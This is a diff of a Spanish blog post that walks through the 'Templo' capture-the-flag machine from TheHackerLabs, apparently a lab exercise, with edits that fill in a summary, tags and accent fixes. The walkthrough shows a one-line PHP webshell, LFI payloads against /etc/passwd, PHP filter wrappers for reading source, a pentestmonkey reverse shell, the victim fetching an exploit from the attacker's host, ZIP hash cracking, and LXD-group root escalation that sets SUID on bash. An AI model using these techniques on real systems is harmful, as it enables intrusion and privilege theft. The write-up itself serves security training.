@@ -1,11 +1,11 @@
 ---
 layout: single
 title: Templo - TheHackerLabs
-excerpt: "."
+excerpt: "Esta es una máquina sencilla, pero que necesita bastante trabajo para resolverla. Comenzamos analizando la página web, pero al no encontrar nada que nos ayude, aplicamos Fuzzing para encontrar directorios ocultos. De esta forma, encontramos un directorio que contiene un archivo de texto con una pista, pero que no podremos usar de momento. Analizando de nuevo la página web principal, probamos un título mencionado en el contenido, resultando en una página oculta. Dicha página, permite subir e incluir archivos, siendo la inclusión de archivos vulnerable a Local File Inclusion (LFI). La subida de archivos, permite subir archivos PHP, lo que nos permite subir una WebShell de PHP, pero al no saber donde ni como se suben los archivos, utilizamos el LFI más PHP Wrappers para obtener el script completo de esta página para analizarlo, siendo así que descubrimos donde se guardan y que el nombre se codifica en ROT13. Sabiendo esto, codificamos el nombre de nuestra WebShell a ROT13 y logramos usarlo en la ruta donde se guarda, siendo de esta forma con la que obtenemos una Reverse Shell. Dentro de la máquina, recordamos la pista que vimos la primera vez que aplicamos Fuzzing y descubrimos un archivo ZIP. Descargamos y crackeamos este archivo, que al ver su contenido, vemos la contraseña de un usuario, con el que nos podemos autenticar vía SSH. Ya en la máquina, como este usuario, descubrimos que está dentro del grupo LXD, por lo que utilizamos un Exploit de la base de datos Exploit-DB de Kali, para abusar de este grupo y poder crear un contenedor que tendrá la montura de la raíz de la máquina víctima. Al ser un contenedor con volumen compartido (bind mount), cualquier cambio que hagamos en la montura, se verá reflejado en la máquina víctima, por lo que le damos permisos SUID a la Bash para escalar privilegios y convertirnos en Root."
 date: 2025-05-29
 classes: wide
 header:
-  teaser: /assets/images/THL-writeup-templo/_logo.png
+  teaser: /assets/images/THL-writeup-templo/templo.jpg
   teaser_home_page: true
   icon: /assets/images/thehackerlabs.jpeg
 categories:
@@ -13,21 +13,49 @@ categories:
   - Easy Machine
 tags:
   - Linux
-  - 
-  - 
+  - Web Enumeration
+  - Fuzzing
+  - Local File Inclusion (LFI)
+  - PHP Wrappers
+  - LFI + PHP Wrappers
+  - ROT13 Decodification
+  - Cracking Hash
+  - Cracking ZIP File
+  - Abusing LXD Group
+  - Privesc - Abusing LXD Group
   - OSCP Style
 ---
-![](/assets/images/THL-writeup-templo/_logo.png)
+![](/assets/images/THL-writeup-templo/templo.jpg)
 
-texto
+Esta es una máquina sencilla, pero que necesita bastante trabajo para resolverla. Comenzamos analizando la página web, pero al no encontrar nada que nos ayude, aplicamos **Fuzzing** para encontrar directorios ocultos. De esta forma, encontramos un directorio que contiene un archivo de texto con una pista, pero que no podremos usar de momento. Analizando de nuevo la página web principal, probamos un título mencionado en el contenido, resultando en una página oculta. Dicha página, permite subir e incluir archivos, siendo la inclusión de archivos vulnerable a **Local File Inclusion (LFI)**. La subida de archivos, permite subir **archivos PHP**, lo que nos permite subir una **WebShell de PHP**, pero al no saber donde ni como se suben los archivos, utilizamos el **LFI** más **PHP Wrappers** para obtener el script completo de esta página para analizarlo, siendo así que descubrimos donde se guardan y que el nombre se codifica en **ROT13**. Sabiendo esto, codificamos el nombre de nuestra **WebShell** a **ROT13** y logramos usarlo en la ruta donde se guarda, siendo de esta forma con la que obtenemos una **Reverse Shell**. Dentro de la máquina, recordamos la pista que vimos la primera vez que aplicamos **Fuzzing** y descubrimos un **archivo ZIP**. Descargamos y crackeamos este archivo, que al ver su contenido, vemos la contraseña de un usuario, con el que nos podemos autenticar vía **SSH**. Ya en la máquina, como este usuario, descubrimos que está dentro del **grupo LXD**, por lo que utilizamos un Exploit de la base de datos **Exploit-DB de Kali**, para abusar de este grupo y poder crear un contenedor que tendrá la montura de la raíz de la máquina víctima. Al ser un contenedor con **volumen compartido (bind mount)**, cualquier cambio que hagamos en la montura, se verá reflejado en la máquina víctima, por lo que le damos **permisos SUID** a la **Bash** para escalar privilegios y convertirnos en **Root**.
 
 Herramientas utilizadas:
 * *ping*
 * *nmap*
-* **
-* **
-* **
-* **
+* *wappalizer*
+* *ffuf*
+* *gobuster*
+* *wfuzz*
+* *PHP*
+* *php://filter/convert.base64-encode*
+* *echo*
+* *base64*
+* *head*
+* *tr*
+* *nc*
+* *bash*
+* *wget*
+* *python3*
+* *unzip*
+* *zip2john*
+* *JohnTheRipper*
+* *ssh*
+* *sudo*
+* *id*
+* *searchsploit*
+* *git*
+* *lxc*
+* *chmod*
 
 
 <br>
@@ -43,17 +71,23 @@ Herramientas utilizadas:
 			</ul>
 		<li><a href="#Analisis">Análisis de Vulnerabilidades</a></li>
 			<ul>
-				<li><a href="#"></a></li>
-				<li><a href="#"></a></li>
+				<li><a href="#HTTP">Analizando Servicio HTTP</a></li>
+				<li><a href="#fuzz">Fuzzing</a></li>
+				<li><a href="#namari">Encontrando y Analizando Página Oculta NAMARI</a></li>
 			</ul>
 		<li><a href="#Explotacion">Explotación de Vulnerabilidades</a></li>
 			<ul>
-				<li><a href="#"></a></li>
-				<li><a href="#"></a></li>
+				<li><a href="#LFI">Aplicando Local File Inclusion (LFI)</a></li>
+				<li><a href="#Wrappers">Probando la Subida de Archivos y Obteniendo Código Fuente del index.php Usando LFI + PHP Wrappers</a></li>
+				<li><a href="#ROT13">Aplicando Codificación ROT13 y Obteniendo Reverse Shell con Nuestra WebShell</a></li>
+				<ul>
+					<li><a href="#monkey">Utilizando Reverse Shell de Pentestmonkey</a></li>
+				</ul>
 			</ul>
 		<li><a href="#Post">Post Explotación</a></li>
 			<ul>
-				<li><a href="#"></a></li>
+				<li><a href="#ZIP">Crackeando Archivo ZIP y Ganando Acceso a la Máquina Como Usuario Rodgar</a></li>
+				<li><a href="#LXD">Escalando Privilegios Abusando del Grupo LXD</a></li>
 			</ul>
 		<li><a href="#Links">Links de Investigación</a></li>
 	</ul>
@@ -159,7 +193,7 @@ Nmap done: 1 IP address (1 host up) scanned in 7.12 seconds
 | *-p*       | Para indicar puertos específicos. |
 | *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |
 
-El escaneo nos esta mostrando contenido en la página web.
+El escaneo nos está mostrando contenido en la página web.
 
 Vayamos a verla y a analizarla.
 
@@ -181,7 +215,7 @@ Entremos:
 <img src="/assets/images/THL-writeup-templo/Captura1.png">
 </p>
 
-Parece ser una página que ofrece servicios de ¿web hosting? ¿fotos?, no entiendo muy bien que servicios esta ofreciendo.
+Parece ser una página que ofrece servicios de ¿web hosting?, ¿fotos? No entiendo muy bien qué servicios está ofreciendo.
 
 Pero por lo que veo, el dolor tiene algo que ver.
 
@@ -278,6 +312,8 @@ Finished
 | *-w*       | Para indicar el diccionario a usar en el fuzzing. |
 | *-t*       | Para indicar la cantidad de hilos a usar. |
 
+<br>
+
 Encontramos un directorio llamado `/wow`.
 
 Si vamos a verlo, veremos un archivo de texto:
@@ -292,7 +328,7 @@ Y entrando en ese archivo de texto, parece que nos da una ruta:
 <img src="/assets/images/THL-writeup-templo/Captura4.png">
 </p>
 
-Pero al intentar entrar en esa ruta, no podremos pues no existe.
+Pero al intentar entrar en esa ruta, no podremos, pues no existe.
 
 Entonces, hay que buscar alguna pista en la página.
 
@@ -314,9 +350,9 @@ Probemos con la palabra **NAMARI**:
 
 Encontramos una página oculta.
 
-Podemos ver que la página tiene un titulo llamado **"Subida de Archivos y LFI"**, que ya es un claro ejemplo de lo que debemos hacer.
+Podemos ver que la página tíene un titulo llamado **"Subida de Archivos y LFI"**, que ya es un claro ejemplo de lo que debemos hacer.
 
-Además, si analizamos el código fuente, podemos ver como funciona la subida de archivos:
+Además, si analizamos el código fuente, podemos ver cómo funciona la subida de archivos:
 
 <p align="center">
 <img src="/assets/images/THL-writeup-templo/Captura7.png">
@@ -328,7 +364,7 @@ Ahora, lo que nos interesa es la parte de la inclusión de archivos, ya que real
 
 Quiero pensar que es aquí donde es probable que se aplique el **LFI**, así que vamos a comprobarlo.
 
-Antes de continuar, veamos si hay algún directorio o archivo oculto, aplicandole **Fuzzing** a este directorio:
+Antes de continuar, veamos si hay algún directorio o archivo oculto, aplicándole **Fuzzing** a este directorio:
 ```bash
 gobuster dir -u http://192.168.10.70/NAMARI/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -t 300
 ===============================================================
@@ -351,7 +387,16 @@ Progress: 1185240 / 1185241 (100.00%)
 Finished
 ===============================================================
 ```
-Muy bien, supongo que ahí es donde se guardaran los archivos que subamos.
+
+| Parámetros | Descripción |
+|--------------------------|
+| *-u*       | Para indicar la URL a utilizar. |
+| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
+| *-t*       | Para indicar la cantidad de hilos a usar. |
+
+<br>
+
+Muy bien, supongo que ahí es donde se guardarán los archivos que subamos.
 
 Continuemos.
 
@@ -367,13 +412,13 @@ Continuemos.
 
 <h2 id="LFI">Aplicando Local File Inclusion (LFI)</h2>
 
-Si intentamos incluir un archivo random, podemos ver como aparece el parámetro `page=` en la URL:
+Si intentamos incluir un archivo random, podemos ver cómo aparece el parámetro `page=` en la URL:
 
 <p align="center">
 <img src="/assets/images/THL-writeup-templo/Captura8.png">
 </p>
 
-Vamos a ocupar **wfuzz** para utilizar el wordlist **LFI-Jhaddix.txt** y así podamos comprobar si es posible aplicar **LFI** y que formas son validas:
+Vamos a ocupar **wfuzz** para utilizar el wordlist **LFI-Jhaddix.txt** y así podamos comprobar si es posible aplicar **LFI** y qué formas son válidas:
 ```bash
 wfuzz -c --hc=404 --hh=2993 -t 300 -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt http://192.168.10.70/NAMARI/index.php?page=FUZZ
 ********************************************************
@@ -449,9 +494,20 @@ ID           Response   Lines    Word       Chars       Payload
 000000274:   200        142 L    303 W      4776 Ch     "../../../../../../etc/passwd"                                                                                               
 000000275:   200        142 L    303 W      4776 Ch     "../../../../../etc/passwd"
 ```
-Hay bastantes formas en las que se puede aplicar y es claro que no se esta aplicando ninguna sanitización.
 
-Apliquemoslo de la forma más simple con `/etc/passwd`:
+| Parámetros | Descripción |
+|--------------------------|
+| *-c*       | Para ver el resultado en un formato colorido. |
+| *--hc*     | Para no mostrar un código de estado en los resultados. |
+| *--hh*     | Para no mostrar respuestas con la cantidad de caracteres especificada. |
+| *-t*       | Para indicar la cantidad de hilos a usar. |
+| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
+
+<br>
+
+Hay bastantes formas en las que se puede aplicar y es claro que no se está aplicando ninguna sanitización.
+
+Apliquémoslo de la forma más simple con `/etc/passwd`:
 
 <p align="center">
 <img src="/assets/images/THL-writeup-templo/Captura9.png">
@@ -469,30 +525,30 @@ Aunque no podremos aplicarle fuerza bruta, por lo que debemos buscar una forma d
 
 <br>
 
-<h2 id="">Probando la Subida de Archivos y Obteniendo Código Fuente del index.php Usando LFI + PHP Wrappers</h2>
+<h2 id="Wrappers">Probando la Subida de Archivos y Obteniendo Código Fuente del index.php Usando LFI + PHP Wrappers</h2>
 
 Vamos a subir una **WebShell** para ver si lo acepta.
 
-Crea un archivo llamado **cmd.php** que tendra este contenido:
+Crea un archivo llamado **cmd.php** que tendrá este contenido:
 ```php
 <?php
 	system($_GET['cmd']);
 ?>
 ```
 
-Y subelo a la página:
+Y súbelo a la página:
 
 <p align="center">
 <img src="/assets/images/THL-writeup-templo/Captura11.png">
 </p>
 
-Si lo acepto.
+Sí lo acepto.
 
-El problema es que no vamos a encontrar nuestro archivo, por lo que quiero pensar que se esta aplicando algún cambio cuando se suben.
+El problema es que no vamos a encontrar nuestro archivo, por lo que quiero pensar que se está aplicando algún cambio cuando se suben.
 
-Por fortuna, tenemos un **LFI**, sabemos que se esta ocupando **PHP** y tenemos el parámetro vulnerable `page=`.
+Por fortuna, tenemos un **LFI**, sabemos que se está ocupando **PHP** y tenemos el parámetro vulnerable `page=`.
 
-Entonces, podemos aplicar **PHP Wrappers** para tratar de obtener el script **index.php** y ver como es que funciona.
+Entonces, podemos aplicar **PHP Wrappers** para tratar de obtener el script **index.php** y ver cómo es que funciona.
 
 Aquí te dejo un link de **HackTricks** donde puedes encontrar Wrappers útiles:
 * <a href="https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html?highlight=LFI#lfi--rfi-using-php-wrappers--protocols" target="_blank">HackTricks - File Inclusion/Path traversal: LFI / RFI using PHP wrappers & protocols</a>
@@ -504,7 +560,7 @@ Nosotros queremos ver el archivo **index.php**, así que solamente debemos agreg
 php://filter/convert.base64-encode/resource=index.php
 ```
 
-Usalo en el campo vulnerable y observa la respuesta:
+Úsalo en el campo vulnerable y observa la respuesta:
 
 <p align="center">
 <img src="/assets/images/THL-writeup-templo/Captura12.png">
@@ -512,7 +568,7 @@ Usalo en el campo vulnerable y observa la respuesta:
 
 Tenemos la **base64**.
 
-Solamente copiala y vamos a decodificarla:
+Solamente cópiala y vamos a decodificarla:
 ```bash
 echo "base64_copiada" | base64 -d | head -n 27
 <?php
@@ -553,11 +609,11 @@ Entonces, solamente necesitamos codificar el nombre del archivo que subimos y pr
 
 Para la codificación, podemos aplicarla con **cyberchef** o con el comando **tr**.
 
-Lo haremos con **tr**, pues esta codificación, simplemente cambia la posición de las letras por 13 espacios. 
+Lo haremos con el comando **tr**, pues esta codificación, simplemente cambia la posición de las letras por 13 espacios. 
 
 Por ejemplo, A sería N, B sería O, C sería P y así sucesivamente.
 
-Probemoslo:
+Probémoslo:
 ```bash
 echo "cmd" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
 pzq
@@ -606,12 +662,12 @@ Estamos dentro.
 Como ya vimos que acepta archivos **PHP**, podemos cargar la **Reverse Shell de PHP** de **Pentestmonkey**:
 * <a href="https://github.com/pentestmonkey/php-reverse-shell" target="_blank">Repositorio de pentestmonkey: php-reverse-shell</a>
 
-Descargalo con **wget**:
+Descárgalo con **wget**:
 ```bash
 wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php
 ```
 
-Y modificalo en esta parte:
+Y modifícalo en esta parte:
 ```php
 set_time_limit (0);
 $VERSION = "1.0";
@@ -624,7 +680,6 @@ $shell = 'uname -a; w; id; /bin/sh -i';
 $daemon = 0;
 $debug = 0;
 ```
-
 Ya solamente sube el archivo a la página web.
 
 Debemos codificar a **ROT13** el nombre de la **Reverse Shell** que subimos, quedando de esta forma:
@@ -686,7 +741,7 @@ Tendremos que escalar privilegios o convertirnos en el **usuario rodgar** para p
 
 Recordando un poco el primer **Fuzzing** que aplicamos, nos mencionaban la ruta `/opt` como si algo se encontrara ahí.
 
-Veamos que se esconde en ese directorio:
+Veamos qué se esconde en ese directorio:
 
 Revisando esa ruta, encontramos un directorio oculto que contiene un **archivo ZIP** llamado **backup.zip**:
 ```bash
@@ -709,7 +764,7 @@ drwxr-xr-x 3 root   root   4096 Aug  6  2024 ..
 ```
 Descarguemos este **archivo ZIP** en nuestra máquina.
 
-Abre un servidor con **Python3** justo donde esta este archivo:
+Abre un servidor con **Python3** justo donde está este archivo:
 ```bash
 www-data@TheHackersLabs-Templo:/opt/.XXX$ python3 -m http.server 8080
 python3 -m http.server 8080
@@ -729,14 +784,14 @@ Archive:  backup.zip
 ```
 Nos pide una contraseña, por lo que tendremos que crackearlo.
 
-Obtengamos el hash de este **archivo ZIP** con la herrmaienta **zip2john**:
+Obtengamos el hash de este **archivo ZIP** con la herramienta **zip2john**:
 ```bash
 zip2john backup.zip > hash
 ver 1.0 backup.zip/backup/ is not encrypted, or stored with non-handled compression type
 ver 1.0 efh 5455 efh 7875 backup.zip/backup/Rodgar.txt PKZIP Encr: 2b chk, TS_chk, cmplen=36, decmplen=24, crc=5C3C7389 ts=8855 cs=8855 type=0
 ```
 
-Y con **JohnTheRipper**,crackeamos el hash:
+Y con **JohnTheRipper**, crackeamos el hash:
 ```bash
 john -w:/usr/share/wordlists/rockyou.txt hash
 Using default input encoding: UTF-8
@@ -791,14 +846,14 @@ rodgar@TheHackersLabs-Templo:~$ sudo -l
 Sorry, user rodgar may not run sudo on TheHackersLabs-Templo.
 ```
 
-Pero, si revisamos a que grupos pertenece nuestro usuario, veremos uno interesante:
+Pero, si revisamos a qué grupos pertenece nuestro usuario, veremos uno interesante:
 ```bash
 rodgar@TheHackersLabs-Templo:~$ id
 uid=1000(rodgar) gid=1000(rodgar) groups=1000(rodgar),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),101(lxd)
 ```
 Estamos en el **grupo LXD**.
 
-Ya hemos explotado este grupo para escalar privilegios en otras máquinas de manera manúal.
+Ya hemos explotado este grupo para escalar privilegios en otras máquinas de manera manual.
 
 Puedes hacerlo siguiendo los pasos que se muestran en estos blogs:
 * <a href="https://medium.com/@mstrbgn/privilege-escalation-using-lxd-lxc-group-assignment-to-a-user-a-security-misconfiguration-a4892f611d6f" target="_blank">Privilege Escalation Using LXD/LXC Group Assignment To A User: A Security Misconfiguration</a>
@@ -828,14 +883,14 @@ earchsploit -m linux/local/46978.sh
 File Type: Bourne-Again shell script, Unicode text, UTF-8 text executable
 ```
 
-Analizandolo un poco, tenemos que mandar este script y una imagen de **alpine** que utilizara el script para crear la montura de la raíz de la máquina víctima.
+Analizándolo un poco, tenemos que mandar este script y una imagen de **alpine** que utilizará el script para crear la montura de la raíz de la máquina víctima.
 
-Para la imagen, ocuparemos la que esta dentro del siguiente repositorio:
+Para la imagen, ocuparemos la que está dentro del siguiente repositorio:
 * <a href="https://github.com/saghul/lxd-alpine-builder.git" target="_blank">Repositorio de saghul: lxd-alpine-builder</a>
 
 Solo necesitas clonarlo y ya deberíamos encontrar una imagen comprimida:
 ```bash
-git clone  https://github.com/saghul/lxd-alpine-builder.git
+git clone https://github.com/saghul/lxd-alpine-builder.git
 cd lxd-alpine-builder
 ls
 alpine-v3.13-x86_64-20210218_0139.tar.gz  build-alpine  LICENSE  README.md
@@ -847,13 +902,13 @@ python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
-Luego, descargalos en la máquina víctima con **wget**:
+Luego, descárgalos en la máquina víctima con **wget**:
 ```bash
 rodgar@TheHackersLabs-Templo:~$ wget http://Tu_IP/46978.sh
 rodgar@TheHackersLabs-Templo:~$ wget http://Tu_IP/alpine-v3.13-x86_64-20210218_0139.tar.gz
 ```
 
-Y ejecuta el script, indicandole que use la imagen de **alpine**:
+Y ejecuta el script, indicándole que use la imagen de **alpine**:
 ```bash
 ./46978.sh -f alpine-v3.13-x86_64-20210218_0139.tar.gz
 Image imported with fingerprint: cd73881adaac667ca3529972c7b380af240a9e3b09730f8c8e4e6a23e1a7892b
@@ -871,17 +926,16 @@ root
 ```
 Funcionó correctamente.
 
-Esto nos creo un contenedor llamado **privesc**, que contendra la raíz de la máquina víctima. Lo podremos ver con el comando `lxc list`:
+Esto nos creó un contenedor llamado **privesc**, que contendrá la raíz de la máquina víctima. Lo podremos ver con el comando `lxc list`:
 ```bash
 rodgar@TheHackersLabs-Templo:~$ lxc list
 +---------+---------+---------------------+-----------------------------------------------+-----------+-----------+
 |  NAME   |  STATE  |        IPV4         |                     IPV6                      |   TYPE    | SNAPSHOTS |
 +---------+---------+---------------------+-----------------------------------------------+-----------+-----------+
-| privesc | RUNNING | 10.212.11.94 (eth0) | fd42:8656:40e9:25e7:216:3eff:fec3:9d7b (eth0) | CONTAINER | 0         |
+| privesc | RUNNING | xx.xx.xx.xx (eth0)  |  XXXX:XXXX:XXXX:XXXX:XXXX:XXXX:XXXX (eth0)    | CONTAINER | 0         |
 +---------+---------+---------------------+-----------------------------------------------+-----------+-----------+
 ```
-
-Entonces, odríamos quedarnos dentro del contenedor, revisando la montura para obtener la flag y ya, pero algo que podemos hacer es, asignarle **permisos SUID** al binario `/bin/bash` (o la **Bash**), que tenemos en esta montura. Esto, para que cuando salgamos del contenedor, podamos usar la **Bash** con privilegios de **Root**.
+Entonces, podríamos quedarnos dentro del contenedor, revisando la montura para obtener la flag y ya, pero algo que podemos hacer es, asignarle **permisos SUID** al binario `/bin/bash` (o la **Bash**), que tenemos en esta montura. Esto es para que, cuando salgamos del contenedor, podamos usar la **Bash** con privilegios de **Root**.
 
 Sal del contenedor y revisa los permisos de la **Bash**:
 ```bash
@@ -889,16 +943,16 @@ Sal del contenedor y revisa los permisos de la **Bash**:
 rodgar@TheHackersLabs-Templo:~$ ls -la /bin/bash
 -rwxr-xr-x 1 root root 1446024 mar 31  2024 /bin/bash
 ```
-Bien, aun no tiene **permisos SUID**.
+Bien, aún no tiene **permisos SUID**.
 
-Entremos denuevo al contenedor y vamos a movernos a la raíz de la montura:
+Entremos de nuevo al contenedor y vamos a movernos a la raíz de la montura:
 ```bash
 rodgar@TheHackersLabs-Templo:~$ lxc exec privesc -- /bin/sh
 ~ # cd mnt/root/
 /mnt/root #
 ```
 
-Asignemosle **permisos SUID** a la **Bash**:
+Asignémosle **permisos SUID** a la **Bash**:
 ```bash
 # Forma 1:
 /mnt/root # chmod u+s bin/bash
@@ -912,11 +966,14 @@ Sal del contenedor y vuelve a revisar los permisos de la **Bash**:
 rodgar@TheHackersLabs-Templo:~$ ls -la /bin/bash
 -rwsr-xr-x 1 root root 1446024 mar 31  2024 /bin/bash
 ```
-Ahí esta, se puede ver el cambio de los permisos.
+Ahí está, se puede ver el cambio de los permisos.
 
-¿Por que pudimos hacer esto?
+------------
+**IMPORTANTE**
 
-Porque montamos el **root filesystem** de la máquina víctima dentro del contenedor como volumen compartido (bind mount), entonces los cambios como dar **permisos SUID** a `/bin/bash`, se reflejan en la máquina víctima.
+¿Por qué pudimos hacer esto?
+
+Porque montamos el **root filesystem** de la máquina víctima dentro del contenedor como **volumen compartido (bind mount)**, entonces los cambios, como dar **permisos SUID** a `/bin/bash`, se reflejan en la máquina víctima.
 
 Podemos comprobar que es una **montura compartida (bind mount)**, si se muestra con tipo **disk** al usar el comando `lxc config device show nombre_contenedor`:
 ```bash
@@ -927,7 +984,9 @@ giveMeRoot:
   source: /
   type: disk
 ```
-Ahí está.
+Ahí está, continuemos.
+
+------------------
 
 Ya podremos convertirnos en **Root**, usando la **Bash** con privilegios:
 ```bash
